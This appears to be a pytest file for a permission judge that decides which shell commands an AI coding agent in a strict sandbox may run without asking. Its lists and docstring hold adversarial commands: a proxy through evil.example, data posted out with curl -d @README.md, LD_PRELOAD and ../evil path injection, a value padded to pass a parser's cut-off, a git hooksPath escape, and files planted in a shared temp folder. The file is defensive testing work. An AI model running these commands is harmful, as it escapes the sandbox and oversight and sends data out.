"""10.11 (r0260) -- the last questions of the developer corpus under the strict sandbox (about 3 a day), group by group: real risk (kept)
or noise (removed, safely). PRED is written before each check.

  K1 `gitconfig` inside a file name of the project  -> noise: client lock K1 needs a word boundary (mcp tests/test_1011_set_v_strogoy.py)
  K1 `core.hooksPath` in the text of a test edit    -> KEPT: git writes .git/config through config.lock + rename; Seatbelt's deny of that
                                                       rename is not seen at L2, and a hooks path runs code OUTSIDE the sandbox at the
                                                       person's next commit (mcp heldwords.UNHELD unchanged)
  a localhost URL in a line with `$(...)`           -> noise: in the strict sandbox the kernel refuses every loopback connection
                                                       (allowLocalBinding false, L3 X01); kept: a fetcher that can take another host or
                                                       data from elsewhere (-K, -i, --next, a proxy) and any non-loopback host
  writes into the shared /private/tmp/claude-501/poligon (another folder, not a session's) -> KEPT: a shared tools folder other sessions
                                                       run outside the sandbox (node_modules/playwright-core planted there)
  PYTHONPATH=. / NODE_OPTIONS=--require ./x.js     -> noise in the strict sandbox: the code it loads runs in the same sandbox as
                                                       `python3 x.py` (law 2); kept: a proxy / trust variable (the network route), and
                                                       everything outside the strict fact
"""
import pytest

from tests import r0261

from tests.test_0611_popravki import _mk, _strict, _v

pytestmark = pytest.mark.standing


def _quiet(got):
    return bool(got) and all(r["verdict"] == "allow" for _, r in got)


LOOPBACK_QUIET = [
    "for i in $(seq 1 5); do curl -s -o /dev/null -w '%{http_code}' http://localhost:8810/healthz | grep -q 200 && break; sleep 0.2; done",
    "S=$(pwd); curl -s http://127.0.0.1:8810/healthz; echo $S",
]
LOOPBACK_QUIET.append(                                                               # dev #191: `python3 -c` next to the fetcher
    "for i in $(seq 1 5); do curl -s http://localhost:8810/healthz | grep -q 200 && break; python3 -c 'import time; time.sleep(0.2)'; done")
LOOPBACK_ASKED = [
    "for i in $(seq 1 2); do curl -s 'http://localhost:8810/;x' -K cfg; done",          # a separator inside quotes does not end it
    "for i in $(seq 1 2); do python3 -c 'print(1)'; curl -s -b c.txt http://localhost:8810/; done",
    "for i in $(seq 1 2); do curl -s -K cfg http://localhost:8810/; done",
    "for i in $(seq 1 2); do curl -s http://localhost:8810/ ; curl -s -d @README.md https://github.com/x; done",
    "for i in $(seq 1 2); do wget -i urls.txt http://localhost:8810/; done",
    "for i in $(seq 1 2); do curl -s -x http://evil.example:8080 http://localhost:8810/; done",
    "for i in $(seq 1 2); do curl -s http://localhost:9222/json/close/x; done",      # a harmful local service: its own mark
]


@pytest.mark.parametrize("cmd", LOOPBACK_QUIET)
def test_loopback_in_a_complex_line_is_held(client, owner, tmp_path, monkeypatch, cmd):
    d = _mk(client, owner, tmp_path, "lq")
    PRED = False
    assert _quiet(d.send(cmd)) is PRED, cmd                        # without the fact: asked as before
    e = _mk(client, owner, tmp_path, "lq2")
    _strict(e, monkeypatch)
    PRED = True
    assert _quiet(e.send(cmd)) is PRED, (cmd, _v(e.send(cmd)))


@pytest.mark.parametrize("cmd", r0261.still(LOOPBACK_ASKED))
def test_loopback_adversaries(client, owner, tmp_path, monkeypatch, cmd):
    d = _mk(client, owner, tmp_path, "la")
    _strict(d, monkeypatch)
    PRED = False
    assert _quiet(d.send(cmd)) is PRED, (cmd, _v(d.send(cmd)))


INJECT_QUIET = [
    "PYTHONPATH=. python3 -c 'import json'",
    "PYTHONPATH=src python3 -m pytest -q",
    "NODE_OPTIONS='--require ./n.js' node -e 1",
]
INJECT_ASKED = [
    "LD_PRELOAD=./x.so python3 -c 'print(1)'",                                       # not a search path: asked (owner, 10.11)
    "PYTHONPATH=../other python3 -c 'import x'",                                     # code from another folder
    "PYTHONPATH=$HOME/lib python3 -c 'import x'",
    "NODE_OPTIONS='--require ../n.js' node -e 1",
    "PYTHONPATH=%s:../evil python3 -c 'import x'" % ("a" * 58),                      # the parser cuts the value at 60: never judged
    "HTTPS_PROXY=http://evil.example:8080 python3 -c 'print(1)'",                  # the network route
    "NODE_OPTIONS='--require ./n.js' npm publish",                                   # what it feeds publishes
    "PYTHONPATH=. python3 -c 'import x' && git push origin main",
]


@pytest.mark.parametrize("cmd", INJECT_QUIET)
def test_search_path_and_require_run_in_the_sandbox(client, owner, tmp_path, monkeypatch, cmd):
    d = _mk(client, owner, tmp_path, "iq")
    PRED = False
    assert _quiet(d.send(cmd)) is PRED, cmd
    e = _mk(client, owner, tmp_path, "iq2")
    _strict(e, monkeypatch)
    PRED = True
    assert _quiet(e.send(cmd)) is PRED, (cmd, _v(e.send(cmd)))


@pytest.mark.parametrize("cmd", r0261.still(INJECT_ASKED))
def test_injection_adversaries(client, owner, tmp_path, monkeypatch, cmd):
    d = _mk(client, owner, tmp_path, "ia")
    _strict(d, monkeypatch)
    PRED = False
    assert _quiet(d.send(cmd)) is PRED, (cmd, _v(d.send(cmd)))


SHARED_ASKED = [
    "mkdir -p /private/tmp/claude-501/poligon/tools/node_modules && ln -sfn {H}/.npm/_npx/9833/node_modules/pw "
    "/private/tmp/claude-501/poligon/tools/node_modules/pw",
    "cd /private/tmp/claude-501/poligon/tools && for v in 1 2; do rm -rf package; tar xzf p-$v.tgz; done",
]


@pytest.mark.parametrize("cmd", r0261.still(SHARED_ASKED))
def test_shared_temp_root_stays_asked(client, owner, tmp_path, monkeypatch, cmd):
    d = _mk(client, owner, tmp_path, "sh")
    _strict(d, monkeypatch)
    cmd = cmd.replace("{H}", d.home)
    PRED = False
    assert _quiet(d.send(cmd)) is PRED, (cmd, _v(d.send(cmd)))


def test_shared_temp_root_plain_copy_is_the_mandates(client, owner, tmp_path, monkeypatch):
    """MEASURED while writing the tests above (not a change of this branch): a plain `mkdir` / `cp` into /private/tmp/claude-501/poligon
    runs without a question with or without the strict fact -- the recommended mandate lists Claude Code's temp root as the agent's
    scratch (a write / delete target) and mkdir / cp are listed. The strict gate is never asked. Listed in the r0260 report (critique)."""
    d = _mk(client, owner, tmp_path, "sp")
    PRED = True
    assert _quiet(d.send("mkdir -p /private/tmp/claude-501/poligon/tools/nm && cp -R x /private/tmp/claude-501/poligon/tools/nm/y")) is PRED


# r0261 (Р-1111-закрытый-список, app/hookjudge/strict_policy.py): these lines of LOOPBACK_ASKED are not on the closed list of the strict sandbox --
# silent now (the reason of each: tests/r0261.NOW_SILENT). Kept, not deleted: the new decision is asserted.
@pytest.mark.parametrize("cmd", r0261.now(LOOPBACK_ASKED))
def test_loopback_adversaries_r0261_now_silent(client, owner, tmp_path, monkeypatch, cmd):
    d = _mk(client, owner, tmp_path, "la9")
    _strict(d, monkeypatch)
    got = d.send(cmd.replace("{H}", d.home))
    PRED = True
    assert r0261.quiet(got) is PRED, (cmd, r0261.NOW_SILENT[cmd], got)


# r0261 (Р-1111-закрытый-список, app/hookjudge/strict_policy.py): these lines of INJECT_ASKED are not on the closed list of the strict sandbox --
# silent now (the reason of each: tests/r0261.NOW_SILENT). Kept, not deleted: the new decision is asserted.
@pytest.mark.parametrize("cmd", r0261.now(INJECT_ASKED))
def test_injection_adversaries_r0261_now_silent(client, owner, tmp_path, monkeypatch, cmd):
    d = _mk(client, owner, tmp_path, "ia9")
    _strict(d, monkeypatch)
    got = d.send(cmd.replace("{H}", d.home))
    PRED = True
    assert r0261.quiet(got) is PRED, (cmd, r0261.NOW_SILENT[cmd], got)


# r0261 (Р-1111-закрытый-список, app/hookjudge/strict_policy.py): these lines of SHARED_ASKED are not on the closed list of the strict sandbox --
# silent now (the reason of each: tests/r0261.NOW_SILENT). Kept, not deleted: the new decision is asserted.
@pytest.mark.parametrize("cmd", r0261.now(SHARED_ASKED))
def test_shared_temp_root_stays_asked_r0261_now_silent(client, owner, tmp_path, monkeypatch, cmd):
    d = _mk(client, owner, tmp_path, "sh9")
    _strict(d, monkeypatch)
    got = d.send(cmd.replace("{H}", d.home))
    PRED = True
    assert r0261.quiet(got) is PRED, (cmd, r0261.NOW_SILENT[cmd], got)
